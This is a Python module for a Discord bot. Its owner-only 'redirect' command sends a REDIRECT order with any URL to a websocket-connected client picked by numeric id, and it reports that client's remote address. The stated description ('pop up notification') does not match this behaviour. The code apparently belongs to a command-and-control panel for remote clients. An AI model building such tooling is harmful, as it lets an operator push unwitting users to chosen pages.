from discord import app_commands
import discord
from core.functions.websocket.ws_registry import WSRegistry
import config


@app_commands.command(name="redirect", description="Send a pop up notification window")
async def redirect(interaction: discord.Interaction, cid: int, url: str):
    try:
        if interaction.user.id not in config.owner_ids:
            embed = discord.Embed(description=f"{config.no} | You are not allowed to use this command", color=config.embederrorcolor)
            await interaction.response.send_message(embed=embed)
            return
        
        client = WSRegistry.get_client(cid)
        if client == None:
            embed = discord.Embed(description=f"{config.no} | Client not found", color=config.embederrorcolor)
            await interaction.response.send_message(embed=embed)
            return
        
        await client.send("REDIRECT", {"url": url})
        
        embed = discord.Embed(title="Order sent", description=f"Sent a `REDIRECT` command to client `{client.websocket.remote_address}: {cid}`\n> **URL**: {url}", color=config.embedcolor)
        
        await interaction.response.send_message(embed=embed)
    except Exception as e:
        await Bot.error(interaction, Bot, e)  
    
async def setup(bot):
    global Bot 
    Bot = bot
    bot.tree.get_command("commands").add_command(redirect)         